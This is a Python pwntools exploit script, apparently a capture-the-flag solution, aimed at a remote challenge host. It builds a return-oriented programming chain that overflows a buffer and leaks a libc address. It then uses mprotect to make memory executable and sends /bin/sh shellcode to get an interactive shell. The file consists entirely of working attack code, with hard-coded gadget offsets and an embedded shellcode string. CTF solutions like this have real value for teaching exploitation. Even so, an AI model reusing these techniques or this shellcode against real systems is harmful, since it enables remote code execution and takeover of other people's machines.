#!/usr/bin/python

import struct, sys
from pwn import *

g_pop_rdi = 0x400d83
g_pop_rbp = 0x400918
g_pop_rsi_r15 = 0x00400d81
g_pop_rbx_rbp_r12_r13_r14_r15 = 0x00400d7a
g_add_rbp_bl = 0x400917
g_leave_ret = 0x4009f0
g_main = 0x4008b0
f_fprintf = 0x400830
got_fprintf = 0x601fb0
data_page = 0x602000

# theirs
delta = 0x64dc0 
offs = 33
libc_poprsi = 0x00023e6a
libc_poprdx = 0x001306b6
libc_poprcxrbx = 0x00103cca
libc_read = 0x110070
libc_mprotect = 0x11bae0

def u64(v):
    return struct.pack("<Q", v)

def rop_s(rop):
    return "".join([ u64(v) for v in rop ])

# *(unsigned char*)(addr) += val
def add8(addr, val):
    return [
        g_pop_rbx_rbp_r12_r13_r14_r15,
        val,
        addr + 0x3d,
        0x1212,
        0x1313,
        0x1414,
        0x1515,
        g_add_rbp_bl
    ]

def write64(addr, val):
    r = []
    for i in xrange(8):
        r += add8(addr + i, (val >> (8*i)) & 0xff)
    return r

SKIP = 0xabcdabcd

def write_overlay(addr, values):
    o = []
    for i in xrange(len(values)):
        if values[i] == SKIP:
            continue
        o += write64(addr + (i*8), values[i])
    return o

if len(sys.argv) == 3:
    target = sys.argv[1]
    port = int(sys.argv[2])
else:
    target = "challenge.pwny.racing"
    port = 11534

s = remote(target, port)

s.recvuntil("file: ")

rop = []

# we use our 'write64' (more like add64) primitive to overlay/interleave a 
# new ropchain in the BSS
bss_overlay_addr = 0x602018
next_stack = 0x602900

bss_overlay = [
    g_pop_rdi, SKIP, # rdi = stdout 
    g_pop_rbp, SKIP, # skip over stdin
    g_pop_rbp, SKIP, # skip over stderr
    g_pop_rsi_r15, got_fprintf, 0, # rsi = fprintf@got
    g_pop_rbp, SKIP, # skip over buffer index
    g_pop_rbp, next_stack,
    g_leave_ret
]

# fprintf eats quite some stack space, so we pivot up a bit in BSS again
bss_hi_overlay_addr = next_stack 
bss_hi_overlay = [
    0x112233445566, # new RBP value
    f_fprintf,
    g_pop_rdi, 0, # argc = 0
    g_main
]

# 0x602060 contains the last char we wrote (0x0a), we increment it with 0xf6
# to wrap it back to zero
rop += add8(0x602060, 0xf6)
rop += write_overlay(bss_overlay_addr, bss_overlay)
rop += write_overlay(bss_hi_overlay_addr, bss_hi_overlay)

# pivot into our BSS overlay
rop += [
    g_pop_rbp,
    bss_overlay_addr - 8,
    g_leave_ret
]

payload = "\x00"*1024 + chr(0x18) + rop_s(rop) + "\n" 
s.send(payload)

resp = s.recvuntil("file: ")

print "*** YO YO YO"

ptr = struct.unpack("<Q", resp[offs:offs+6] + "\x00\x00")[0]
print "# fprintf@libc = 0x%x" % (ptr)

libc_base = ptr - delta
print "# libc base = 0x%x" % (libc_base)

rop_final = [
    # mprotect(.data, 0x1000, PROT_RWX)
    g_pop_rdi,
    data_page,
    libc_base + libc_poprsi,
    0x1000,
    libc_base + libc_poprdx,
    0x7,
    libc_base + libc_mprotect,

    # read(stdin, .data, 0x200)
    g_pop_rdi,
    0,
    libc_base + libc_poprsi,
    data_page,
    libc_base + libc_poprdx,
    0x200,
    libc_base + libc_read,

    # call shellcode
    data_page
]

payload = "\x00"*1024 + chr(0x18) + rop_s(rop_final) + "\n"
s.send(payload)

# thanks shell-storm
sc = "31c050488b1424eb105478065e5fb03b0f05595b40b00bcd80e8ebffffff".decode("hex")
sc += "/bin/sh\x00"

s.send(sc)

print "*** MAYBE WE GET SHELL NOW?"

s.interactive()
